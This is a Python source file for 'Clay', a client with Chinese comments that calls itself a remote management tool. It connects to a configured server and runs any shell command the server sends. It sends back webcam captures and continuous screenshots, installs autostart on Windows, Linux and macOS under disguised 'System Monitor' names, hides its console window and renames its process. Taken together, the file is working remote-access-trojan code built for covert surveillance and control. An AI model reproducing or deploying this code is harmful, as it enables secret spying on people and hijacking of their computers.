import base64
import os
import platform
import subprocess
import threading
import time
import sys
import shutil
from pathlib import Path
import ctypes  # 用于Windows API调用
import tempfile  # 用于临时文件处理

import cv2  # 需要 pip install opencv-python
import psutil  # 需要 pip install psutil
import socketio
from mss import mss  # 用于跨平台屏幕捕获，需要 pip install mss
from PIL import Image  # 用于图像处理，需要 pip install pillow

from config import SERVER_URL, HEARTBEAT_INTERVAL, RECONNECT_DELAY, SCREENSHOT_INTERVAL  # 屏幕捕获间隔配置

# 初始化 Socket.IO 客户端
sio = socketio.Client(reconnection_delay=RECONNECT_DELAY)

# 添加客户端启动时间
client_start_time = time.time()

# 控制是否隐藏进程的标志
HIDE_PROCESS = True

# 屏幕监视相关全局变量
screen_monitoring = False  # 屏幕监视状态
screen_thread = None  # 屏幕监视线程
screen_stop_event = threading.Event()  # 屏幕监视停止事件
screenshot_quality = 80  # 截图质量 (0-100)
screenshot_scale = 1.0  # 截图缩放比例


# --- 进程隐藏功能 ---
def hide_console_window():
    """隐藏控制台窗口（仅Windows有效）"""
    if platform.system() == "Windows":
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # 0 表示SW_HIDE
                return True
        except Exception as e:
            print(f"隐藏控制台窗口失败: {e}")
    return False


def set_process_name(name):
    """尝试修改进程名称"""
    try:
        if platform.system() == "Windows":
            ctypes.windll.kernel32.SetConsoleTitleW(name)
            return True
        elif platform.system() in ["Linux", "Darwin"]:
            import prctl  # 需要安装：pip install python-prctl
            prctl.set_name(name)
            return True
        return False
    except Exception as e:
        print(f"修改进程名称失败: {e}")
        return False


def run_in_background():
    """尝试在后台运行进程，不显示窗口"""
    if platform.system() == "Windows" and 'pythonw.exe' not in sys.executable:
        try:
            pythonw_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(pythonw_path):
                subprocess.Popen([pythonw_path, __file__], close_fds=True)
                sys.exit(0)
        except Exception as e:
            print(f"切换到后台运行失败: {e}")


# --- 系统信息获取 ---
def get_system_info():
    """获取主机名和操作系统信息"""
    hostname = platform.node()
    os_info = f"{platform.system()} {platform.release()}"
    return hostname, os_info


# --- 开机自启动功能实现 ---
def get_script_path():
    """获取当前脚本的绝对路径"""
    try:
        if getattr(sys, 'frozen', False):
            return os.path.abspath(sys.executable)
        else:
            return os.path.abspath(__file__)
    except Exception as e:
        print(f"获取脚本路径失败: {e}")
        return None


def set_autostart(enable=True):
    """设置或取消开机自启动"""
    script_path = get_script_path()
    if not script_path:
        return False, "无法获取脚本路径，无法设置自启动"

    os_name = platform.system()

    try:
        if os_name == "Windows":
            return _set_autostart_windows(enable, script_path)
        elif os_name == "Linux":
            return _set_autostart_linux(enable, script_path)
        elif os_name == "Darwin":  # macOS
            return _set_autostart_macos(enable, script_path)
        else:
            return False, f"不支持的操作系统: {os_name}"
    except Exception as e:
        return False, f"设置自启动失败: {str(e)}"


def _set_autostart_windows(enable, script_path):
    """Windows系统设置自启动"""
    import winreg as reg
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "ClayClient"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_ALL_ACCESS)
        if enable:
            reg.SetValueEx(key, app_name, 0, reg.REG_SZ, script_path)
            key.Close()
            return True, "Windows 自启动已开启"
        else:
            try:
                reg.DeleteValue(key, app_name)
                key.Close()
                return True, "Windows 自启动已关闭"
            except FileNotFoundError:
                key.Close()
                return True, "Windows 自启动项不存在，无需关闭"
    except PermissionError:
        return False, "设置自启动失败，需要管理员权限"
    except Exception as e:
        return False, f"Windows 设置自启动失败: {str(e)}"


def _set_autostart_linux(enable, script_path):
    """Linux系统设置自启动"""
    app_name = "system-monitor"
    autostart_dir = os.path.expanduser("~/.config/autostart")
    desktop_file = os.path.join(autostart_dir, f"{app_name}.desktop")

    try:
        os.makedirs(autostart_dir, exist_ok=True)
        if enable:
            with open(desktop_file, "w") as f:
                f.write(f"""[Desktop Entry]
Type=Application
Name=System Monitor
Comment=System monitoring service
Exec={sys.executable} "{script_path}"
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
            os.chmod(desktop_file, 0o755)
            return True, "Linux 自启动已开启"
        else:
            if os.path.exists(desktop_file):
                os.remove(desktop_file)
                return True, "Linux 自启动已关闭"
            else:
                return True, "Linux 自启动项不存在，无需关闭"
    except Exception as e:
        return False, f"Linux 设置自启动失败: {str(e)}"


def _set_autostart_macos(enable, script_path):
    """macOS系统设置自启动"""
    app_name = "SystemMonitor"
    plist_file = os.path.expanduser(f"~/Library/LaunchAgents/com.{app_name}.agent.plist")

    try:
        if enable:
            with open(plist_file, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{app_name}.agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/dev/null</string>
    <key>StandardErrorPath</key>
    <string>/dev/null</string>
</dict>
</plist>
""")
            subprocess.run(["launchctl", "load", plist_file], check=True)
            return True, "macOS 自启动已开启"
        else:
            if os.path.exists(plist_file):
                subprocess.run(["launchctl", "unload", plist_file], check=True)
                os.remove(plist_file)
                return True, "macOS 自启动已关闭"
            else:
                return True, "macOS 自启动项不存在，无需关闭"
    except subprocess.CalledProcessError as e:
        return False, f"macOS launchctl 命令执行失败: {str(e)}"
    except Exception as e:
        return False, f"macOS 设置自启动失败: {str(e)}"


def check_autostart_status():
    """检查当前自启动状态"""
    script_path = get_script_path()
    if not script_path:
        return False, "无法获取脚本路径，无法检查自启动状态"

    os_name = platform.system()

    try:
        if os_name == "Windows":
            return _check_autostart_windows(script_path)
        elif os_name == "Linux":
            return _check_autostart_linux(script_path)
        elif os_name == "Darwin":  # macOS
            return _check_autostart_macos(script_path)
        else:
            return False, f"不支持的操作系统: {os_name}"
    except Exception as e:
        return False, f"检查自启动状态失败: {str(e)}"


def _check_autostart_windows(script_path):
    """检查Windows系统自启动状态"""
    import winreg as reg
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    app_name = "ClayClient"

    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_READ)
        value, _ = reg.QueryValueEx(key, app_name)
        key.Close()
        is_enabled = value == script_path
        return is_enabled, "Windows 自启动已开启" if is_enabled else "Windows 自启动路径不匹配"
    except FileNotFoundError:
        return False, "Windows 自启动已关闭"
    except Exception as e:
        return False, f"Windows 检查自启动失败: {str(e)}"


def _check_autostart_linux(script_path):
    """检查Linux系统自启动状态"""
    app_name = "system-monitor"
    desktop_file = os.path.expanduser(f"~/.config/autostart/{app_name}.desktop")

    try:
        if not os.path.exists(desktop_file):
            return False, "Linux 自启动已关闭"

        with open(desktop_file, "r") as f:
            content = f.read()

        expected_exec = f"Exec={sys.executable} \"{script_path}\""
        is_enabled = expected_exec in content
        return is_enabled, "Linux 自启动已开启" if is_enabled else "Linux 自启动配置不匹配"
    except Exception as e:
        return False, f"Linux 检查自启动失败: {str(e)}"


def _check_autostart_macos(script_path):
    """检查macOS系统自启动状态"""
    app_name = "SystemMonitor"
    plist_file = os.path.expanduser(f"~/Library/LaunchAgents/com.{app_name}.agent.plist")

    try:
        if not os.path.exists(plist_file):
            return False, "macOS 自启动已关闭"

        result = subprocess.run(
            ["launchctl", "list", f"com.{app_name}.agent"],
            capture_output=True,
            text=True
        )

        if result.returncode != 0:
            return False, "macOS 自启动已关闭"

        with open(plist_file, "r") as f:
            content = f.read()

        expected_path = f"<string>{script_path}</string>"
        is_enabled = expected_path in content
        return is_enabled, "macOS 自启动已开启" if is_enabled else "macOS 自启动配置不匹配"
    except Exception as e:
        return False, f"macOS 检查自启动失败: {str(e)}"


# --- 命令执行函数 ---
def execute_shutdown(args=None):
    """执行关机命令"""
    print("收到关机命令，准备执行...")
    try:
        if platform.system() == "Windows":
            os.system("shutdown /s /t 1 /f")
        elif platform.system() in ["Linux", "Darwin"]:
            os.system("sudo shutdown now")
        else:
            return False, f"不支持的操作系统: {platform.system()}"
        print("关机命令已发送")
        return True, "关机命令已发送"
    except Exception as e:
        print(f"执行关机命令失败: {e}")
        return False, f"执行关机命令失败: {e}"


def execute_lock(args=None):
    """执行锁屏命令"""
    print("收到锁屏命令，准备执行...")
    try:
        if platform.system() == "Windows":
            os.system("rundll32.exe user32.dll,LockWorkStation")
        elif platform.system() == "Linux":
            os.system(
                "xdg-screensaver lock || gnome-screensaver-command -l || cinnamon-screensaver-command -l || mate-screensaver-command -l")
        elif platform.system() == "Darwin":
            os.system("/System/Library/CoreServices/Menu\\ Extras/User.menu/Contents/Resources/CGSession -suspend")
        else:
            return False, f"不支持的操作系统: {platform.system()}"
        print("锁屏命令已执行")
        sio.emit('command_result', {'command': 'lock', 'success': True, 'message': '锁屏命令已执行'})
        return True, "锁屏命令已执行"
    except Exception as e:
        print(f"执行锁屏命令失败: {e}")
        sio.emit('command_result', {'command': 'lock', 'success': False, 'message': f'执行锁屏命令失败: {e}'})
        return False, f"执行锁屏命令失败: {e}"


# 全局变量
current_working_directory = os.getcwd()  # 初始工作目录
current_processes = set()  # 跟踪所有创建的子进程


def execute_shell_command(command):
    """执行shell命令并将输出发送回服务器，支持目录追踪"""
    global current_processes, current_working_directory
    print(f"准备执行shell命令: [{command}]")

    start_time = time.time()
    sio.emit('terminal_output', {'output': f"\n[CLAY] 🚀 执行命令: {command}\n"})
    sio.emit('terminal_output', {'output': "--------------------------------------------\n"})

    # 特殊处理cd命令
    if command.strip().lower().startswith('cd '):
        try:
            target_dir = command[3:].strip()

            # 处理Windows环境变量
            if '%' in target_dir:
                process = subprocess.Popen(
                    f'echo {target_dir}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                output, _ = process.communicate()
                target_dir = output.strip()

            # 处理相对路径
            if not os.path.isabs(target_dir):
                target_dir = os.path.join(current_working_directory, target_dir)

            # 尝试切换目录
            if os.path.exists(target_dir) and os.path.isdir(target_dir):
                os.chdir(target_dir)
                current_working_directory = os.getcwd()

                sio.emit('terminal_output', {'output': f"已切换到目录: {current_working_directory}\n"})

                # 显示目录内容
                process = subprocess.Popen(
                    'dir' if platform.system() == "Windows" else 'ls',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=current_working_directory
                )
                stdout, stderr = process.communicate()
                sio.emit('terminal_output', {'output': stdout})
                if stderr:
                    sio.emit('terminal_output', {'output': f"错误: {stderr}\n"})

                update_terminal_prompt()
                end_time = time.time()
                sio.emit('terminal_output',
                         {'output': f"\n[CLAY] ✅ 命令执行成功 (耗时: {end_time - start_time:.2f}秒)\n"})
                return
            else:
                sio.emit('terminal_output', {'output': f"错误: 目录不存在 - {target_dir}\n"})
                end_time = time.time()
                sio.emit('terminal_output',
                         {'output': f"\n[CLAY] ❌ 命令执行失败 (耗时: {end_time - start_time:.2f}秒)\n"})
                return
        except Exception as e:
            sio.emit('terminal_output', {'output': f"处理cd命令时出错: {str(e)}\n"})
            end_time = time.time()
            sio.emit('terminal_output', {'output': f"\n[CLAY] ❌ 命令执行失败 (耗时: {end_time - start_time:.2f}秒)\n"})
            return

    # 执行普通命令
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            cwd=current_working_directory
        )

        current_processes.add(process)
        line_count = 0

        try:
            # 实时发送标准输出
            for line in process.stdout:
                output = line.rstrip()
                line_count += 1
                sio.emit('terminal_output', {'output': output + '\n'})

            # 发送错误输出
            stderr_lines = 0
            for line in process.stderr:
                output = line.rstrip()
                stderr_lines += 1
                if stderr_lines == 1:
                    sio.emit('terminal_output', {'output': "\n[CLAY] ⚠️ 错误输出:\n"})
                sio.emit('terminal_output', {'output': "  " + output + '\n'})

            # 等待进程完成
            return_code = process.wait(timeout=30)
            execution_time = time.time() - start_time

            sio.emit('terminal_output', {'output': "--------------------------------------------\n"})
            if return_code == 0:
                if line_count > 0:
                    sio.emit('terminal_output', {
                        'output': f"[CLAY] ✅ 命令执行成功 (耗时: {execution_time:.2f}秒, 输出: {line_count}行)\n\n"})
                else:
                    sio.emit('terminal_output',
                             {'output': f"[CLAY] ✅ 命令执行成功，无输出 (耗时: {execution_time:.2f}秒)\n\n"})
            else:
                sio.emit('terminal_output',
                         {'output': f"[CLAY] ❌ 命令返回错误代码: {return_code} (耗时: {execution_time:.2f}秒)\n\n"})

        except subprocess.TimeoutExpired:
            process.kill()
            sio.emit('terminal_output', {'output': "\n[CLAY] ⏱️ 命令执行超时(30秒)，已强制终止\n\n"})

        if process in current_processes:
            current_processes.remove(process)

    except Exception as e:
        if 'process' in locals() and process in current_processes:
            current_processes.remove(process)
        error_message = f"\n[CLAY] 🛑 执行出错: {str(e)}\n\n"
        sio.emit('terminal_output', {'output': error_message})


def execute_capture_webcam():
    """捕获摄像头画面并发送到服务器"""
    print("准备捕获摄像头画面...")
    sio.emit('terminal_output', {'output': "\n[CLAY] 📷 正在尝试访问摄像头...\n"})

    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            error_msg = "无法访问摄像头，请确保摄像头已连接且未被其他程序占用"
            print(error_msg)
            sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
            return False, error_msg

        # 设置分辨率
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)

        # 读取一帧
        ret, frame = cap.read()
        if not ret:
            error_msg = "无法从摄像头读取图像"
            print(error_msg)
            sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
            cap.release()
            return False, error_msg

        # 调整大小
        scale_percent = 75
        width = int(frame.shape[1] * scale_percent / 100)
        height = int(frame.shape[0] * scale_percent / 100)
        resized = cv2.resize(frame, (width, height), interpolation=cv2.INTER_AREA)

        # 压缩图像
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
        _, buffer = cv2.imencode('.jpg', resized, encode_param)

        # 转换为base64并发送
        jpg_as_text = base64.b64encode(buffer).decode('utf-8')
        sio.emit('webcam_frame', {'image_data': jpg_as_text, 'client_id': sio.sid})

        cap.release()
        sio.emit('terminal_output', {'output': f"[CLAY] ✅ 摄像头画面已捕获并发送\n"})
        return True, "摄像头画面已捕获并发送"

    except Exception as e:
        error_msg = f"捕获摄像头画面时出错: {str(e)}"
        print(error_msg)
        sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
        return False, error_msg


# --- 屏幕监视功能 ---
def capture_screenshot():
    """捕获屏幕截图并返回base64编码的图像数据"""
    try:
        with mss() as sct:
            # 获取主显示器
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)

            # 转换为PIL Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")

            # 应用缩放
            if screenshot_scale != 1.0:
                new_width = int(img.width * screenshot_scale)
                new_height = int(img.height * screenshot_scale)
                img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)

            # 保存到内存缓冲区
            with tempfile.SpooledTemporaryFile() as f:
                img.save(f, format="JPEG", quality=screenshot_quality)
                f.seek(0)
                img_data = f.read()

            # 转换为base64
            base64_data = base64.b64encode(img_data).decode('utf-8')
            return True, base64_data, img.size

    except Exception as e:
        print(f"屏幕截图失败: {e}")
        return False, str(e), None


def screen_monitoring_loop():
    """屏幕监视循环"""
    global screen_monitoring
    print("屏幕监视线程已启动")
    sio.emit('terminal_output', {'output': "\n[CLAY] 🖥️ 屏幕监视已开始\n"})

    # 记录连续失败次数，避免频繁错误输出
    consecutive_failures = 0

    while not screen_stop_event.is_set():
        success, data, size = capture_screenshot()

        if success:
            consecutive_failures = 0  # 重置失败计数
            # 发送格式与摄像头保持一致，便于服务端统一处理
            sio.emit('screen_frame', {
                'image_data': data,
                'timestamp': time.time(),
                'width': size[0],
                'height': size[1],
                'client_id': sio.sid  # 增加客户端ID，便于服务端识别
            })
            # 等待指定间隔
            screen_stop_event.wait(SCREENSHOT_INTERVAL)
        else:
            consecutive_failures += 1
            # 失败次数过多时暂停
            if consecutive_failures <= 3:  # 只输出前3次失败
                sio.emit('terminal_output', {'output': f"[CLAY] ⚠️ 屏幕截图失败: {data}\n"})
            elif consecutive_failures == 4:
                sio.emit('terminal_output', {'output': f"[CLAY] ⚠️ 屏幕截图多次失败，将减少错误提示\n"})

            # 失败时延长等待时间，避免占用资源
            wait_time = min(5, SCREENSHOT_INTERVAL) if consecutive_failures < 5 else 10
            screen_stop_event.wait(wait_time)

    # 监视结束处理
    screen_monitoring = False
    print("屏幕监视线程已停止")
    sio.emit('terminal_output', {'output': "\n[CLAY] 🖥️ 屏幕监视已停止\n"})


def start_screen_monitoring():
    """开始屏幕监视"""
    global screen_monitoring, screen_thread, screen_stop_event

    if screen_monitoring:
        return False, "屏幕监视已在运行中"

    # 确保停止事件已重置
    screen_stop_event.clear()

    # 创建并启动线程（设置守护线程）
    screen_thread = threading.Thread(target=screen_monitoring_loop, daemon=True)
    screen_thread.start()

    # 等待线程启动
    start_timeout = 2
    start_time = time.time()
    while not screen_monitoring and (time.time() - start_time) < start_timeout:
        time.sleep(0.1)

    screen_monitoring = True
    return True, "屏幕监视已启动"


def stop_screen_monitoring():
    """停止屏幕监视"""
    global screen_monitoring, screen_thread, screen_stop_event

    if not screen_monitoring:
        return False, "屏幕监视未在运行中"

    # 触发停止事件
    screen_stop_event.set()

    # 等待线程结束（增加超时保护）
    if screen_thread and screen_thread.is_alive():
        screen_thread.join(timeout=5)
        if screen_thread.is_alive():
            print("屏幕监视线程无法正常终止，强制标记为停止")

    screen_monitoring = False
    return True, "屏幕监视已停止"


def set_screenshot_quality(quality):
    """设置截图质量"""
    global screenshot_quality

    try:
        quality = int(quality)
        if 0 <= quality <= 100:
            screenshot_quality = quality
            return True, f"截图质量已设置为 {quality}%"
        else:
            return False, "质量值必须在0-100之间"
    except ValueError:
        return False, "质量值必须是整数"


def set_screenshot_scale(scale):
    """设置截图缩放比例"""
    global screenshot_scale

    try:
        scale = float(scale)
        if 0.1 <= scale <= 1.0:
            screenshot_scale = scale
            return True, f"截图缩放比例已设置为 {scale:.1f}x"
        else:
            return False, "缩放比例必须在0.1-1.0之间"
    except ValueError:
        return False, "缩放比例必须是数字"


# --- 处理单次屏幕截图命令 ---
def execute_single_screenshot(quality):
    """执行单次屏幕截图并发送"""
    print(f"执行单次屏幕截图，质量: {quality}%")
    sio.emit('terminal_output', {'output': f"\n[CLAY] 🖥️ 正在捕获屏幕截图 (质量: {quality}%)...\n"})

    # 临时保存当前质量，执行后恢复
    original_quality = screenshot_quality
    set_screenshot_quality(quality)

    try:
        success, data, size = capture_screenshot()
        if success:
            # 发送截图数据（与摄像头格式一致）
            sio.emit('screen_frame', {
                'image_data': data,
                'timestamp': time.time(),
                'width': size[0],
                'height': size[1],
                'client_id': sio.sid
            })
            # 确认发送成功
            sio.emit('terminal_output', {'output': f"[CLAY] ✅ 屏幕截图已捕获并发送 (大小: {len(data)}字符)\n"})
            return True, "屏幕截图已捕获并发送"
        else:
            error_msg = f"屏幕截图失败: {data}"
            sio.emit('terminal_output', {'output': f"[CLAY] ❌ {error_msg}\n"})
            return False, error_msg
    finally:
        # 恢复原始质量设置
        set_screenshot_quality(original_quality)


# --- Socket.IO 事件处理 ---
@sio.event
def connect():
    """连接成功后执行"""
    print(f"成功连接到服务器: {SERVER_URL}")
    hostname, os_info = get_system_info()
    sio.emit('register', {'hostname': hostname, 'os': os_info})
    print(f"已发送注册信息: 主机名={hostname}, 系统={os_info}")

    register_client()
    start_heartbeat()


@sio.event
def connect_error(data):
    """连接失败时执行"""
    print(f"无法连接到服务器: {SERVER_URL}")
    print(f"错误信息: {data}")


@sio.event
def disconnect():
    """与服务器断开连接时执行"""
    print("与服务器断开连接")
    if screen_monitoring:
        stop_screen_monitoring()


@sio.on('execute_command')
def on_execute_command(data):
    """处理服务器发来的命令执行请求"""
    command = data.get('command', '').strip()
    print(f"收到命令请求: {command}")

    # 特殊Clay命令处理
    if command.lower() == 'clay help':
        show_clay_help()
        return
    elif command.lower() == 'clay info':
        show_system_info()
        return
    elif command.lower() == 'clay status':
        show_clay_status()
        return
    elif command.lower() == 'capture_webcam':
        execute_capture_webcam()
        return
    elif command.lower() == 'clay autostart on':
        success, message = set_autostart(True)
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        return
    elif command.lower() == 'clay autostart off':
        success, message = set_autostart(False)
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        return
    elif command.lower() == 'clay autostart status':
        is_enabled, message = check_autostart_status()
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'🟢' if is_enabled else '🔴'} {message}\n"})
        return
    elif command.lower() == 'clay hide':
        success = False
        message = ""
        if hide_console_window():
            success = True
            message = "控制台窗口已隐藏"
        if set_process_name("system-monitor"):
            success = True
            message += "，进程名称已修改"
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        return

    # 屏幕监视命令处理
    elif command.lower() == 'clay screen on':
        success, message = start_screen_monitoring()
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        return
    elif command.lower() == 'clay screen off':
        success, message = stop_screen_monitoring()
        sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        return
    elif command.lower().startswith('clay screen quality '):
        try:
            quality = command.split(' ')[3]
            success, message = set_screenshot_quality(quality)
            sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        except IndexError:
            sio.emit('terminal_output', {'output': "\n[CLAY] ❌ 请指定质量值 (0-100)\n"})
        return
    elif command.lower().startswith('clay screen scale '):
        try:
            scale = command.split(' ')[3]
            success, message = set_screenshot_scale(scale)
            sio.emit('terminal_output', {'output': f"\n[CLAY] {'✅' if success else '❌'} {message}\n"})
        except IndexError:
            sio.emit('terminal_output', {'output': "\n[CLAY] ❌ 请指定缩放比例 (0.1-1.0)\n"})
        return
    # 处理单次截图命令
    elif command.lower().startswith('clay screen capture '):
        try:
            quality = command.split(' ')[3]
            execute_single_screenshot(quality)
        except IndexError:
            # 如果未指定质量，使用默认值
            execute_single_screenshot(80)
        return

    # 原有的命令处理
    if command == 'lock':
        execute_lock()
    elif command == 'shutdown':
        execute_shutdown()
    else:
        execute_shell_command(command)


# --- 心跳机制 ---
heartbeat_thread = None
stop_heartbeat = threading.Event()


def send_heartbeat():
    """定期发送心跳包"""
    while not stop_heartbeat.is_set():
        try:
            if sio.connected:
                sio.emit('heartbeat', {'timestamp': time.time(), 'client_id': sio.sid})
            stop_heartbeat.wait(HEARTBEAT_INTERVAL)
        except socketio.exceptions.ConnectionError:
            print("心跳发送失败：连接错误")
            stop_heartbeat.wait(RECONNECT_DELAY)
        except Exception as e:
            print(f"心跳线程出错: {e}")
            stop_heartbeat.wait(HEARTBEAT_INTERVAL)


def start_heartbeat():
    """启动心跳线程"""
    global heartbeat_thread
    if heartbeat_thread is None or not heartbeat_thread.is_alive():
        stop_heartbeat.clear()
        heartbeat_thread = threading.Thread(target=send_heartbeat)
        heartbeat_thread.daemon = True
        heartbeat_thread.start()
        print("心跳线程已启动")


def stop_heartbeat_thread():
    """停止心跳线程"""
    global heartbeat_thread
    if heartbeat_thread and heartbeat_thread.is_alive():
        stop_heartbeat.set()
        heartbeat_thread.join(timeout=2)
        print("心跳线程已停止")
    heartbeat_thread = None


# 特殊命令的实现
def show_clay_help():
    """显示Clay客户端帮助信息"""
    help_text = """
[CLAY] 📚 Clay 远程管理客户端帮助

基本命令:
  clay help               - 显示此帮助信息
  clay info               - 显示系统信息
  clay status             - 显示Clay客户端状态
  clay autostart on       - 开启开机自启动
  clay autostart off      - 关闭开机自启动
  clay autostart status   - 查看开机自启动状态
  clay hide               - 隐藏进程窗口和修改进程名称

屏幕监视命令:
  clay screen on          - 开始屏幕监视
  clay screen off         - 停止屏幕监视
  clay screen capture N   - 捕获单次屏幕截图（质量N%，0-100）
  clay screen quality N   - 设置截图质量 (0-100)
  clay screen scale X     - 设置截图缩放比例 (0.1-1.0)

系统操作:
  标准Shell命令           - 直接输入任何系统支持的命令
  lock                    - 锁定屏幕
  shutdown                - 关闭系统
"""
    sio.emit('terminal_output', {'output': help_text})


def show_system_info():
    """显示系统详细信息"""
    try:
        hostname = platform.node()
        os_info = platform.platform()
        python_version = platform.python_version()

        # CPU信息
        cpu_info = f"{platform.processor()} ({psutil.cpu_count(logical=False)} 物理核心, {psutil.cpu_count()} 逻辑核心)"
        cpu_usage = f"{psutil.cpu_percent()}%"

        # 内存信息
        memory = psutil.virtual_memory()
        memory_info = f"总计: {format_bytes(memory.total)}, 已用: {format_bytes(memory.used)} ({memory.percent}%)"

        # 磁盘信息
        disk = psutil.disk_usage('/')
        disk_info = f"总计: {format_bytes(disk.total)}, 已用: {format_bytes(disk.used)} ({disk.percent}%)"

        # 网络信息
        net_io = psutil.net_io_counters()
        net_info = f"发送: {format_bytes(net_io.bytes_sent)}, 接收: {format_bytes(net_io.bytes_recv)}"

        # 自启动状态
        autostart_enabled, autostart_msg = check_autostart_status()
        autostart_info = f"{'开启' if autostart_enabled else '关闭'} ({autostart_msg.split(':')[-1].strip()})"

        # 屏幕监视状态
        screen_status = "运行中" if screen_monitoring else "已停止"
        screen_details = f"{screen_status} (间隔: {SCREENSHOT_INTERVAL}秒, 质量: {screenshot_quality}%)"

        info_text = f"""
[CLAY] 💻 系统信息

主机名: {hostname}
操作系统: {os_info}
Python版本: {python_version}
开机自启动: {autostart_info}
屏幕监视: {screen_details}

CPU信息: {cpu_info}
CPU使用率: {cpu_usage}

内存: {memory_info}
磁盘(/): {disk_info}
网络: {net_info}

当前时间: {time.strftime('%Y-%m-%d %H:%M:%S')}
运行时间: {format_uptime(psutil.boot_time())}
"""
        sio.emit('terminal_output', {'output': info_text})
    except Exception as e:
        sio.emit('terminal_output', {'output': f"[CLAY] ❌ 获取系统信息失败: {e}"})


def show_clay_status():
    """显示Clay客户端状态信息"""
    try:
        autostart_enabled, _ = check_autostart_status()

        # 屏幕监视状态信息
        screen_details = ""
        if screen_monitoring:
            screen_details = f"运行中 (间隔: {SCREENSHOT_INTERVAL}秒, 质量: {screenshot_quality}%, 缩放: {screenshot_scale}x)"
        else:
            screen_details = "已停止"

        status_text = f"""
[CLAY] 📊 Clay客户端状态

连接状态: {'已连接' if sio.connected else '未连接'}
服务器地址: {SERVER_URL}
心跳间隔: {HEARTBEAT_INTERVAL}秒
重连延迟: {RECONNECT_DELAY}秒
开机自启动: {'🟢 已开启' if autostart_enabled else '🔴 已关闭'}
进程隐藏: {'🟢 已启用' if HIDE_PROCESS else '🔴 已禁用'}
屏幕监视: {'🟢' if screen_monitoring else '🔴'} {screen_details}
客户端启动时间: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(client_start_time))}
运行时长: {format_duration(time.time() - client_start_time)}
内存占用: {format_bytes(psutil.Process(os.getpid()).memory_info().rss)}
"""
        sio.emit('terminal_output', {'output': status_text})
    except Exception as e:
        sio.emit('terminal_output', {'output': f"[CLAY] ❌ 获取状态失败: {e}"})


# 辅助函数
def format_bytes(bytes):
    """格式化字节数为人类可读形式"""
    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
        if bytes < 1024:
            return f"{bytes:.2f} {unit}"
        bytes /= 1024
    return f"{bytes:.2f} PB"


def format_uptime(boot_time):
    """格式化系统运行时间"""
    uptime_seconds = time.time() - boot_time
    days = int(uptime_seconds // 86400)
    hours = int((uptime_seconds % 86400) // 3600)
    minutes = int((uptime_seconds % 3600) // 60)

    if days > 0:
        return f"{days}天 {hours}小时 {minutes}分钟"
    elif hours > 0:
        return f"{hours}小时 {minutes}分钟"
    else:
        return f"{minutes}分钟"


def format_duration(duration_seconds):
    """格式化持续时间"""
    days = int(duration_seconds // 86400)
    hours = int((duration_seconds % 86400) // 3600)
    minutes = int((duration_seconds % 3600) // 60)
    seconds = int(duration_seconds % 60)

    parts = []
    if days > 0:
        parts.append(f"{days}天")
    if hours > 0:
        parts.append(f"{hours}小时")
    if minutes > 0:
        parts.append(f"{minutes}分钟")
    if seconds > 0 or len(parts) == 0:
        parts.append(f"{seconds}秒")

    return " ".join(parts)


def cleanup_completed_processes():
    """清理已完成的进程引用"""
    global current_processes
    for proc in list(current_processes):
        if proc.poll() is not None:
            current_processes.remove(proc)
    return len(current_processes)


def force_terminate_windows_processes():
    """使用更强力的方法终止Windows下的命令行进程"""
    try:
        batch_path = os.path.join(os.environ['TEMP'], 'terminate_commands.bat')
        with open(batch_path, 'w') as f:
            f.write('@echo off\n')
            f.write('echo 正在终止所有命令...\n')
            f.write('taskkill /F /FI "WINDOWTITLE eq 命令提示符*" /T\n')
            f.write('taskkill /F /FI "IMAGENAME eq cmd.exe" /T\n')
            f.write('taskkill /F /FI "IMAGENAME eq ping.exe" /T\n')
            f.write('taskkill /F /FI "IMAGENAME eq tracert.exe" /T\n')
            f.write('echo 终止完成。\n')

        subprocess.run([batch_path], shell=True)
        os.remove(batch_path)
        return True
    except Exception as e:
        print(f"创建批处理文件失败: {e}")
        return False


